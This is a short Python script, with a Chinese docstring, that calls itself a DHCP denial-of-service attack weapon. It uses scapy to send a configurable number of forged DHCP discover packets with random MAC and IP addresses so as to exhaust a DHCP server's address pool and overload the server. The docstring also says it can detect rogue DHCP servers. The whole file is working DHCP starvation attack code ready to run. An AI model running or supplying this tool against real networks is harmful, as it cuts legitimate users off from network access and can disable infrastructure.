# coding=utf-8
"""
DATE:   2021/11/22
AUTHOR: TesterCC
"""
import json
import optparse

from scapy.all import *

from scapy.layers.inet import IP, Ether, UDP
from scapy.layers.dhcp import DHCP, BOOTP

import binascii

"""
传输层 UDP, DHCP拒绝服务攻击

原理：
1.将伪造的大量DHCP请求报文发送到服务器，使DHCP服务器地址池中的IP地址很快被分配完毕，从而导致合法用户无法申请到IP地址。
2.同时，大量的DHCP请求也会导致服务器高负荷运行，从而导致设备瘫痪。

可用于检测网络中的非法DHCP服务器

python DHCP拒绝服务攻击武器.py --count 200
"""

ret = dict()
ret['status'] = None


def start_attack(count):
    for i in range(count):
        xid_random = random.randint(1, 900000000)
        mac_random = str(RandMAC())
        client_mac_id = binascii.unhexlify(mac_random.replace(':', ''))
        # print(mac_random)
        # src="0.0.0.0"
        dhcp_discover = Ether(src=mac_random, dst="ff:ff:ff:ff:ff:ff") / IP(src=str(RandIP()),
                                                                            dst="255.255.255.255") / UDP(
            sport=68, dport=67) / BOOTP(chaddr=client_mac_id, xid=xid_random) / DHCP(
            options=[("message-type", "discover"), "end"])
        sendp(dhcp_discover, iface='以太网', verbose=False)

    ret['status'] = 'success'


def main():
    parser = optparse.OptionParser('usage: python %prog --count 200 \n')
    parser.add_option('-c', '--count', dest='attack_count', default='500', type='string', help='send packet count')
    options, args = parser.parse_args()
    start_attack(int(options.attack_count))
    print(json.dumps(ret))


if __name__ == '__main__':
    main()
